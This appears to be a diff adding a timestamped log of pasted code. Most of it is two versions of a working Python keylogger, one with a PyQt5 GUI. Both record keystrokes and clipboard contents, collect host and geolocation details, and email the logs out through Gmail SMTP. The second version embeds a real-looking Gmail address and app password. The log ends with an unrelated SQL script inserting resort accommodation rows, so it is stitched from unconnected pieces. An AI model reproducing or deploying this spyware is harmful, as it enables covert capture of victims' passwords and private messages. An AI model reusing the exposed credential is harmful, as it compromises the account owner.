+            if keys:
+                log_data = self.format_keys(keys)
+                self.send_log(log_data)  # Send the log via email
+            return False  # Stop listener
+
+    def format_keys(self, keys):
+        log_parts = []
+        for key in keys:
+            k = str(key).replace("'", "")
+            if "space" in k:
+                log_parts.append(' ')
+            elif "enter" in k:
+                log_parts.append('[ENTER]')
+            elif "backspace" in k:
+                if log_parts:  # Remove the last logged key if there's one
+                    log_parts.pop()
+            elif "Key" in k:
+                log_parts.append(f"[{k.upper()}]")
+            else:
+                log_parts.append(k)
+        return ''.join(log_parts)
+
+    def track_clipboard(self):
+        try:
+            previous_clipboard = ""
+            if not os.path.exists("clipboard_log.txt"):
+                open("clipboard_log.txt", "w").close()
+
+            while self.running:
+                clipboard_content = pyperclip.paste()
+                if clipboard_content != previous_clipboard:
+                    print(f"New clipboard content: {clipboard_content}")
+                    with open("clipboard_log.txt", "a") as log_file:
+                        log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                    previous_clipboard = clipboard_content
+                time.sleep(2)
+        except Exception as e:
+            print(f"Error tracking clipboard: {e}")
+
+    def send_log(self, log_data):
+        sender_email = "your_email@gmail.com"
+        sender_password = "your_password"
+        recipient_email = "recipient_email@gmail.com"
+
+        now = datetime.datetime.now()
+        subject = f"Keylogger Report - {now.strftime('%Y-%m-%d %H:%M:%S')}"
+
+        msg = MIMEMultipart()
+        msg['From'] = sender_email
+        msg['To'] = recipient_email
+        msg['Subject'] = subject
+
+        computer_info = self.get_computer_info()
+        geo_location_info = self.get_geo_location()
+
+        # Email body
+        body = f"""
+        <html>
+        <body>
+        <h2>Keylogger Report</h2>
+        <h3>Computer Information</h3>
+        <pre>{computer_info}</pre>
+        <h3>Geo-Location Details</h3>
+        <pre>{geo_location_info}</pre>
+        <h3>Log Data:</h3>
+        <p>Please find the keylogs and the clipboard log in the attached log files.</p>
+        </body>
+        </html>
+        """
+        msg.attach(MIMEText(body, "html"))
+
+        # Attach keylog file
+        log_file_path = "log.txt"
+        with open(log_file_path, "w") as log_file:
+            log_file.write(log_data)
+
+        with open(log_file_path, "rb") as attachment:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(attachment.read())
+            encoders.encode_base64(part)
+            part.add_header("Content-Disposition", f"attachment; filename=log.txt")
+            msg.attach(part)
+
+        # Attach clipboard log file
+        clipboard_log_path = "clipboard_log.txt"
+        if os.path.exists(clipboard_log_path):
+            with open(clipboard_log_path, "r") as clipboard_file:
+                clipboard_data = clipboard_file.read()
+            clipboard_attachment = MIMEText(clipboard_data, 'plain')
+            clipboard_attachment.add_header('Content-Disposition', 'attachment', filename="clipboard_log.txt")
+            msg.attach(clipboard_attachment)
+        else:
+            print("Clipboard log not found.")
+
+        try:
+            with smtplib.SMTP('smtp.gmail.com', 587) as server:
+                server.starttls()
+                server.login(sender_email, sender_password)
+                server.send_message(msg)
+            print("Log data sent successfully!")
+            os.remove(log_file_path)
+        except Exception as e:
+            print(f"Failed to send email: {e}")
+
+    def get_computer_info(self):
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+
+    def get_geo_location(self):
+        try:
+            response = requests.get("https://ipinfo.io/json")
+            if response.status_code == 200:
+                data = response.json()
+                location = (
+                    f"IP Address: {data.get('ip')}\n"
+                    f"City: {data.get('city')}\n"
+                    f"Region: {data.get('region')}\n"
+                    f"Country: {data.get('country')}\n"
+                    f"Location (Lat, Long): {data.get('loc')}\n"
+                    f"Organization: {data.get('org')}\n"
+                )
+                return location
+            else:
+                return "Failed to get geo-location data."
+        except Exception as e:
+            return f"Error retrieving geo-location: {e}"
+
+    def stop(self):
+        self.running = False
+        print("Keylogger stopped.")
+
+# Create the main window GUI
+class MainWindow(QMainWindow):
+    update_log_signal = pyqtSignal(str)  # Signal to update log in GUI
+
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Keylogger GUI")
+        self.setGeometry(200, 200, 600, 400)
+
+        # Text edit widget to display logs
+        self.text_edit = QTextEdit(self)
+        self.text_edit.setGeometry(10, 10, 580, 300)
+
+        # Button to stop the keylogger
+        self.stop_button = QPushButton("Stop Keylogger", self)
+        self.stop_button.setGeometry(10, 320, 150, 30)
+        self.stop_button.clicked.connect(self.stop_keylogger)
+
+        # Button to start the keylogger
+        self.start_button = QPushButton("Start Keylogger", self)
+        self.start_button.setGeometry(170, 320, 150, 30)
+        self.start_button.clicked.connect(self.start_keylogger)
+
+        # Initialize the keylogger
+        self.keylogger = Keylogger()
+        self.keylogger.log_signal.connect(self.update_log_display)
+
+    def start_keylogger(self):
+        self.keylogger.start()
+
+    def stop_keylogger(self):
+        self.keylogger.stop()
+
+    def update_log_display(self, log_data):
+        self.text_edit.append(log_data)  # Update the textEdit widget with new log
+
+# Main function to start the PyQt5 application
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+
+    main_window = MainWindow()
+    main_window.show()
+
+    sys.exit(app.exec_())
+
+[2025-01-27 12:44:37.633059] Using PyQt's QThread
+[2025-01-27 12:48:25.821975] # Import required modules
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import requests
+import pyperclip
+import time
+import threading
+import os  # Missing import
+
+# Initialize variables
+keys = []
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        # Ensure the clipboard log file exists
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            # Get current clipboard content
+            clipboard_content = pyperclip.paste()
+            # Check if clipboard content has changed
+            if clipboard_content != previous_clipboard:
+                print(f"New clipboard content: {clipboard_content}")
+                # Log clipboard content to a file
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to send the log via email
+def send_log(log_data):
+    sender_email = "seamuscody123@gmail.com"
+    sender_password = "ysttlvswdketqork"  # Replace with your actual app-specific password
+    recipient_email = "seamuscody123@gmail.com"
+
+    now = datetime.datetime.now()
+    subject = f"Keylogger Report - {now.strftime('%Y-%m-%d %H:%M:%S')}"
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+
+    computer_info = get_computer_info()
+    geo_location_info = get_geo_location()
+
+    body = f"""
+    <html>
+    <body>
+    <h2>Keylogger Report</h2>
+    <h3>Computer Information</h3>
+    <pre>{computer_info}</pre>
+    <h3>Geo-Location Details</h3>
+    <pre>{geo_location_info}</pre>
+    <h3>Log Data:</h3>
+    <p>Please find the keylogs and the clipboard log in the attached log files.</p>
+    </body>
+    </html>
+    """
+    msg.attach(MIMEText(body, "html"))
+
+    # Attach keylog file
+    log_file_path = "log.txt"
+    if os.path.exists(log_file_path):
+        with open(log_file_path, "rb") as attachment:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(attachment.read())
+            encoders.encode_base64(part)
+            part.add_header("Content-Disposition", f"attachment; filename=log.txt")
+            msg.attach(part)
+
+    # Attach clipboard log file
+    clipboard_log_path = "clipboard_log.txt"
+    if os.path.exists(clipboard_log_path):
+        with open(clipboard_log_path, "rb") as clipboard_file:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(clipboard_file.read())
+            encoders.encode_base64(part)
+            part.add_header("Content-Disposition", f"attachment; filename=clipboard_log.txt")
+            msg.attach(part)
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+        print("Log data sent successfully!")
+        os.remove(log_file_path)
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Function to handle key press events
+def on_press(key):
+    global keys
+    keys.append(key)
+    print(f"{key} pressed")
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:  # Remove the last logged key if there's one
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to handle key release events
+def on_release(key):
+    global keys
+    if key == Key.esc:
+        if keys:
+            log_data = format_keys(keys)
+            send_log(log_data)
+        return False
+
+# Start clipboard tracking in a separate thread
+clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+clipboard_thread.start()
+
+# Start the keyboard listener
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+[2025-02-12 11:36:30.655923] -- CREATE DATABASE Resort;
+
+USE resort;
+
+-- INSERT INTO Resort_type (resort_type_id, resort_type)
+-- VALUES(1, 'Ocean');
+
+-- INSERT INTO Resort_type (resort_type_id, resort_type)
+-- VALUES(2, 'Lakeside');
+
+-- INSERT INTO Resort_type (resort_type_id, resort_type)
+-- VALUES(3, 'Mountaintop');
+
+-- INSERT INTO Resort_type (resort_type_id, resort_type)
+-- VALUES(4, 'County');
+
+-- INSERT INTO Resort (resort_id, resort_type_id, name)
+-- VALUES(10, 1, 'Light of the ocean');
+
+
+-- INSERT INTO Resort (resort_id, resort_type_id, name)
+-- VALUES(11, 1, 'Breaking Bahamas');
+
+-- INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+-- VALUES(20, 10, 'Bungalow', 289);
+
+-- INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+-- VALUES(21, 10, 'Bungalow2', 289);
+
+-- INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+-- VALUES(22, 10, 'Bungalow3', 325);
+
+-- INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+-- VALUES(23, 11, 'Suite101', 299);
+
+-- INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+-- VALUES(24, 11, 'Suite201', 399);
+
+-- INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+-- VALUES(25, 11, 'Suite301', 499);
+
+-- INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+-- VALUES(26, 11, 'Suite401', 599)
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(27, 11, 'penthouse_suite', 799);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(28, 11, 'penthouse', 899);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(29, 11, 'lakeside_bungalow', 799);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(30, 11, 'oceanside_bungalow', 799);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(31, 11, 'oceanside_condo', 1000);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(32, 11, 'mountantop_bungalow', 799);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(33, 11, 'country_ranch', 1000);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(34, 11, 'country_bungalow', 799);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(35, 11, 'penthouse 2', 799);
+
+INSERT INTO accommodations (accommodations_id, resort_id, description_type, cost_per_night)
+VALUES(36, 11, 'penthouse_suite2', 799);
+
+-- SELECT * FROM resort_type;
